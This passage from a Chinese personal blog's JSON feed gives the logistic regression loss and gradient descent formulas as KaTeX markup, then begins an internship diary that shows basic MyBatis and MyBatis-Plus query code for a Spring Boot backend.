reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\"><span class=\"delimsizing size1\">)</span></span><span class=\"mpunct\">,</span></span></span><span style=\"top:-2.4em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mopen\"><span class=\"delimsizing size1\">(</span></span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\"><span class=\"delimsizing size1\">)</span></span><span class=\"mpunct\">,</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.96em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.46em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mord\">1</span></span></span><span style=\"top:-2.4em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mord\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.96em;\"><span></span></span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></p>\n<p>其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">y_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 表示真实结果，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>P</mi><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">P(x_i)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> 为样本 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">x_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5806em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 的概率分布（预测结果）。</p>\n<p>为了在计算机中实现，可将 <strong>整体样本的损失函数</strong> 等效为：</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mtable rowspacing=\"0.25em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mi>J</mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><mfrac><mn>1</mn><mi>m</mi></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msub><mi>J</mi><mi>i</mi></msub><mo>=</mo><mo>−</mo><mfrac><mn>1</mn><mi>m</mi></mfrac><mo fence=\"false\" stretchy=\"true\" minsize=\"2.4em\" maxsize=\"2.4em\">[</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mo fence=\"true\" stretchy=\"true\" minsize=\"1.2em\" maxsize=\"1.2em\">(</mo><msub><mi>y</mi><mi>i</mi></msub><mi>log</mi><mo>⁡</mo><mo fence=\"true\" stretchy=\"true\" minsize=\"1.2em\" maxsize=\"1.2em\">(</mo><mi>P</mi><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><mo fence=\"true\" stretchy=\"true\" minsize=\"1.2em\" maxsize=\"1.2em\">)</mo><mo>+</mo><mo stretchy=\"false\">(</mo><mn>1</mn><mo>−</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><mi>log</mi><mo>⁡</mo><mo fence=\"true\" stretchy=\"true\" minsize=\"1.2em\" maxsize=\"1.2em\">(</mo><mn>1</mn><mo>−</mo><mi>P</mi><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><mo fence=\"true\" stretchy=\"true\" minsize=\"1.2em\" maxsize=\"1.2em\">)</mo><mo fence=\"true\" stretchy=\"true\" minsize=\"1.2em\" maxsize=\"1.2em\">)</mo><mo fence=\"false\" stretchy=\"true\" minsize=\"2.4em\" maxsize=\"2.4em\">]</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}J&amp;=\\frac{1}{m}\\sum_{i=1}^{m}J_{i}=-\\frac{1}{m}\\bigg[\\sum_{i=1}^{m}\\bigl(y_{i}\\log\\bigl(P(x_{i})\\bigr)+(1-y_{i})\\log\\bigl(1-P(x_{i})\\bigr)\\bigr)\\bigg]\\end{aligned}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:3.2291em;vertical-align:-1.3645em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8645em;\"><span style=\"top:-3.8645em;\"><span class=\"pstrut\" style=\"height:3.6514em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.3645em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8645em;\"><span style=\"top:-3.8645em;\"><span class=\"pstrut\" style=\"height:3.6514em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.3214em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">m</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.686em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.6514em;\"><span style=\"top:-1.8723em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.05em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.3em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.2777em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0962em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mord\">−</span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.3214em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">m</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.686em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mord\"><span class=\"delimsizing size3\">[</span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.6514em;\"><span style=\"top:-1.8723em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.05em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.3em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.2777em;\"><span></span></span></span></span></span><span class=\"mopen\"><span class=\"delimsizing size1\">(</span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mopen\"><span class=\"delimsizing size1\">(</span></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\"><span class=\"delimsizing size1\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mopen\"><span class=\"delimsizing size1\">(</span></span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\"><span class=\"delimsizing size1\">)</span></span><span class=\"mclose\"><span class=\"delimsizing size1\">)</span></span><span class=\"mord\"><span class=\"delimsizing size3\">]</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.3645em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n<blockquote>\n<p>回归问题求解</p>\n</blockquote>\n<p>即<mark>最小化损失函数</mark>：使用<strong>梯度下降法</strong>，寻找 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi><mi>i</mi><mi>n</mi><mo stretchy=\"false\">(</mo><mi>J</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">min(J)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">min</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mclose\">)</span></span></span></span> 情况下决策边界中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>θ</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">\\theta_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 的值。</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>θ</mi><mrow><mi>j</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><msub><mi>θ</mi><mi>j</mi></msub><mo>−</mo><mi>α</mi><mfrac><mi mathvariant=\"normal\">∂</mi><mrow><mi mathvariant=\"normal\">∂</mi><msub><mi>θ</mi><mi>j</mi></msub></mrow></mfrac><mi>J</mi><mo stretchy=\"false\">(</mo><mi>θ</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">{\\theta_{j+1}}=\\theta_{j}-\\alpha\\frac{\\partial}{\\partial\\theta_{j}}J(\\theta)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9805em;vertical-align:-0.2861em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mbin mtight\">+</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2861em;\"><span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9805em;vertical-align:-0.2861em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2861em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.4224em;vertical-align:-0.5423em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8801em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\" style=\"margin-right:0.05556em;\">∂</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">θ</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3281em;\"><span style=\"top:-2.357em;margin-left:-0.0278em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2819em;\"><span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\" style=\"margin-right:0.05556em;\">∂</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.5423em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">θ</span><span class=\"mclose\">)</span></span></span></span></p>\n<p>每次寻找都为：上一次的结果 + 梯度反方向 × 某一固定值<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0037em;\">α</span></span></span></span><br />\n 实际上，每次寻找都会不断接近最优值。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1706001384/Typera/2024/01/4a47e17e4a692ff9178d97d1f41f5dec.png\" alt=\"image-20240123171620499\" /></p>\n",
            "tags": [
                "毕业设计",
                "机器学习"
            ]
        },
        {
            "id": "https://www.sycamore.top/Diary/2023-12-4/",
            "url": "https://www.sycamore.top/Diary/2023-12-4/",
            "title": "实习半月总结",
            "date_published": "2023-12-06T03:05:53.000Z",
            "content_html": "<p>在杭州某公司 <code>springboot</code>  后端开发岗干了半个月，发现了很多不足，以及一些值得记录的地方。</p>\n<hr />\n<p>我在入职的时候，其实在 <code>springboot</code>  方面是算是个小白，只懂一点基础知识，甚至 mybatis 框架都没有上手用过...</p>\n<p>先是尝试自己照着模板写，然后看同事的代码修改，现在勉强算是熟练掌握基本的增删改查的接口编写了。</p>\n<p>但是，我总是能发现一些新的写法，更加方便更加灵活，但应该对应不同的应用场景，也应该相互结合使用。</p>\n<h2 id=\"最开始\"><a class=\"anchor\" href=\"#最开始\">#</a> 最开始</h2>\n<p>最开始，我学会使用 <code>Mybatis</code>  写增删改查，</p>\n<p>在 <code>.xml</code>  文件中写 <code>sql</code>  语句：</p>\n<p><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;function_name&quot;</span> <span class=\"attr\">resultType</span>=<span class=\"string\">&quot;java.util.Map&quot;</span>&gt;</span></span><br><span class=\"line\">    select * from table_name</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>或者直接在 <code>DAO</code>  层在函数名上方用 <code>@...</code>  注解：</p>\n<p><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Select(&quot;select * from table_name&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">// or</span></span><br><span class=\"line\"><span class=\"meta\">@Insert(&quot;insert into table_name (id, field_name) values (#&#123;id&#125;, #&#123;function_variable_name&#125;)&quot;)</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"然后\"><a class=\"anchor\" href=\"#然后\">#</a> 然后</h2>\n<p>然后，我知道了 <code>MyBatis-Plus</code> ，</p>\n<p>可以继承通用 Service 层 <code>IService</code>  和通用 Mapper 层 <code>BaseMapper</code> ，它们集成了相当一部分可用的增删改查函数，直接调用就行，不用写 <code>sql</code>  语句：</p>\n<p><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">ServiceName</span> <span 